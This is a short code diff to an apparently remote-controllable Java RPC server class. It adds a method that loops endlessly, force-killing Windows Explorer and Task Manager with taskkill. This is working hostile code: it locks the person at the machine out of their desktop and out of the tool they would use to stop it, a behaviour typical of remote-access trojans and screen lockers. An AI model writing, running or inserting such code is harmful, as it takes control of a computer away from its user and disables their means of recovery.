@@ -62,4 +62,22 @@ public class RpcServerMethods {
             e.printStackTrace();
         }
     }
+
+    public void runKillTaskmngrAndExp() {
+        while(true) {
+            try {
+                // Kill explorer.exe
+                Process explorer = Runtime.getRuntime().exec("taskkill /F /IM explorer.exe");
+                explorer.waitFor();
+
+                // Kill Taskmgr.exe
+                Process taskmgr = Runtime.getRuntime().exec("taskkill /F /IM Taskmgr.exe");
+                taskmgr.waitFor();
+
+                System.out.println("explorer.exe and Taskmgr.exe killed!");
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+    }
 }
